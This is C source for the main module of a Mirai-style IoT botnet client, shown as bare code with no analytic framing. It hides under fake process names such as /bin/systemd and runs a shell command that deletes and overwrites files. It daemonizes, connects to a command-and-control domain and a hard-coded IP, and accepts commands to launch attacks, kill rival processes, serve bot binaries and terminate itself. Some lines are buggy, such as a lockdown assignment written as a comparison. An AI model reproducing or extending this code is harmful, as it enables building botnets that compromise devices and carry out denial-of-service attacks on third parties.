#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <sys/wait.h>
#include <linux/limits.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "util.h"
#include "resolv.h"
#include "killer.h"
#include "tcp.h"
#include "huawei.h"
#include "httpd.h"

#define INSTANCE_PORT 1124
#define PING "ping"
#define WEBBY "webserv"
int first_connect = 0;
int updating = 0;
int httpd_port = 0;
int httpd_started = 0;

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static BOOL unlock_tbl_if_nodebug(char *);
static void teardown_connection(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, num_tries = 0, main_pid;
BOOL pending_connection = FALSE;
static int bind_sock = -1, pgid = 0;
void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

int main(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[15];
    char name_buf2[15];
    int name_buf_len;
    int name_buf2_len;
    int tbl_exec_succ_len, pings = 0;
    httpd_started = 0;
    lockdown = 1;

#ifdef DEBUG
    printf("DEBUG MODE\n");

    struct sigaction sa;
    sa.sa_flags = SA_SIGINFO;

    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("sigaction");

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("sigaction");
#endif

    LOCAL_ADDR = util_local_addr();
    table_init();
    anti_gdb_entry(0);
    rand_init();
    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
    else
        util_strcpy(id_buf, "h");

        //name_buf = "/app/lib"; // our pr name
    //dir_buf = "app/lib"; // our pr name
    char cbuf[100];
    char *namebufs[3] = {"/bin/busybox", "/bin/watchdog", "/bin/systemd"};
    char *dirbufs[3] = {"bin/busybox", "bin/watchdog", "bin/systemd"};
    char *dirr[3] = {"bin", "bin", "bin"};
    int fag;
    fag = rand_next() % 3;
    util_strcpy(cbuf, "rm -rf ");
    util_strcat(cbuf, dirbufs[fag]);
    util_strcat(cbuf, " && mkdir ");
    util_strcat(cbuf, dirr[fag]);
    util_strcat(cbuf, "; >");
    util_strcat(cbuf, dirbufs[fag]);
    util_strcat(cbuf, " &&  mv ");
    util_strcat(cbuf, args[0]);
    util_strcat(cbuf, " ");
    util_strcat(cbuf, dirbufs[fag]);
    util_strcat(cbuf, "; chmod 777 ");
    util_strcat(cbuf, dirbufs[fag]);
    #ifdef DEBUG
    printf(cbuf);
    #else
    system(cbuf);
    #endif
    util_strcpy(args[0], namebufs[fag]);
    prctl(PR_SET_NAME, namebufs[fag]);


    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (fork() > 0)
        return 0;

    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif
 
    attack_init();
    killer_init();
    
    huawei_init();

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if(updating == 0)
        {
            if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
            {
                struct sockaddr_in cli_addr;
                socklen_t cli_addr_len = sizeof (cli_addr);
    
                accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
    
		  	#ifdef DEBUG
                printf("[main] Detected newer instance running! Killing self\n");
		  	#endif
                killer_kill();
                attack_kill_all();
                kill(pgid * -1, 9);
                exit(0);
            }
        }
        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
                    teardown_connection();
                }
                else
                {
                    LOCAL_ADDR = util_local_addr();
                    
                    char sendbuf[64];
                    uint8_t id_len = util_strlen(id_buf);

                    util_zero(sendbuf, 64);
                    util_memcpy(sendbuf, "\x33\x66\x99", 3);
                    util_memcpy(sendbuf + 3, &id_len, sizeof(uint16_t));
                    util_memcpy(sendbuf + 3 + sizeof(uint8_t), id_buf, id_len);
                    send(fd_serv, sendbuf, 3 + sizeof(uint8_t) + id_len, MSG_NOSIGNAL);
                    util_zero(sendbuf, 64);
                    
					#ifdef DEBUG
                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
					#endif
                }
            }
        }

        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, rdbuf, sizeof(rdbuf), MSG_NOSIGNAL);
            if (n <= 0)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                {
                    teardown_connection();
                    continue;
                }
            }

			#ifdef DEBUG
            printf("[main] Received %d bytes from CNC\n", n);
			#endif

            if (n > 0)
            {
                if (rdbuf[0] == '\x99' && rdbuf[1] == '\x66')
                {
                    if(rdbuf[2] == '\x33')
                    {
                       #ifdef DEBUG
                        printf("[main] ping received from cnc\n");
                       #endif
                        char sendbuf[64];
                        uint8_t id_len = util_strlen(PING);
                        util_zero(sendbuf, 64);
                        util_memcpy(sendbuf, "\x66\x99\x66", 3);
                        util_memcpy(sendbuf + 3, &id_len, sizeof(uint16_t));
                        util_memcpy(sendbuf + 3 + sizeof(uint8_t), PING, id_len);
                        send(fd_serv, sendbuf, 3 + sizeof(uint8_t) + id_len, MSG_NOSIGNAL);
                        util_zero(rdbuf, sizeof(rdbuf));
                        continue;
                    }
                    if(rdbuf[2] == '\x66')
                    {

                        if(first_connect == 0)
                        {
                            first_connect = 1;
                            continue;
                        }
                        else
                        {
                            #ifdef DEBUG
                            printf("receieved termination command from cnc\n");
                            #endif
                            updating = 1;

                            close(fd_ctrl);
                            close(fd_serv);
        
                            kill(pgid * -1, SIGKILL);
                            exit(0);
                        }
                    }
                }
                else if(rdbuf[0] == '\x33' && rdbuf[1] == '\x66')
                {
                    if(rdbuf[2] == '\x99')
                    {
                        #ifdef DEBUG
                        printf("[main] cnc requesting httpd server details\n");
                        #endif
                        char sendbuf[64];
                        char tmpbuf[18];
                        if(httpd_started == 1)
                        {
                            sprintf(tmpbuf, "%s:%d", WEBBY, httpd_port);

                            uint8_t id_len = util_strlen(tmpbuf);
                            util_zero(sendbuf, 64);
                            util_memcpy(sendbuf, "\x66\x99\x66", 3);
                            util_memcpy(sendbuf + 3, &id_len, sizeof(uint16_t));
                            util_memcpy(sendbuf + 3 + sizeof(uint8_t), tmpbuf, id_len);
                            send(fd_serv, sendbuf, 3 + sizeof(uint8_t) + id_len, MSG_NOSIGNAL);
                            util_zero(sendbuf, 64);
                            #ifdef DEBUG
                            printf("[main] webserver details sent\n");
                            #endif
                        }
                    }
                    if(rdbuf[2] == '\x33')
                    {
                        #ifdef DEBUG
                        printf("[main] cnc requesting binary update for webserver\n");
                        #endif
                        if(httpd_started == 1)
                        {
                            int i;
                            for(i = 0; i < 8; i++)
                                update_bins(arch_names[i], NULL);
                        }
                    }
                    if(rdbuf[2] == '\x66')
                    {
                        #ifdef DEBUG
                        printf("[main] cnc initiating webserver to start\n");
                        #endif
                        if(httpd_started != 1)
                        {

                            httpd_port = rand_next() % (65535 - 1024) + 1024;
                            httpd_start(httpd_port);
                            httpd_started = 1;
                        }  
                    }
                }
                else if(rdbuf[0] == '\x66' && rdbuf[1] == '\x66')
                {
                    if(rdbuf[2] == '\x99')
                    {
                        #ifdef DEBUG
                        printf("[main] cnc initiating lockdown to start\n");
                        #endif
                        lockdown = 1;
                    }
                    if(rdbuf[2] == '\x66')
                    {
                        #ifdef DEBUG
                        printf("[main] cnc pausing lockdown\n");
                        #endif
                        if(httpd_started != 1)
                        {
                                lockdown == 0;
                        }  
                    }

                }
                else
                    attack_parse(rdbuf, n);
            }

            util_zero(rdbuf, sizeof(rdbuf));
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    srv_addr.sin_family = AF_INET;
    /*srv_addr.sin_addr.s_addr = INET_ADDR(178,128,246,156);
    srv_addr.sin_port = htons(55650);
    */
    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);

    if (entries == NULL)
    {
        return;
    }

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    srv_addr.sin_port = htons(56999);
    resolv_entries_free(entries);
}

static void teardown_connection(void)
{
    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep((rand_next() % 10) + 1);
}


static void establish_connection(void)
{
#ifdef DEBUG
    printf("[main] Attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[main] Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Should call resolve_cnc_addr
    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}
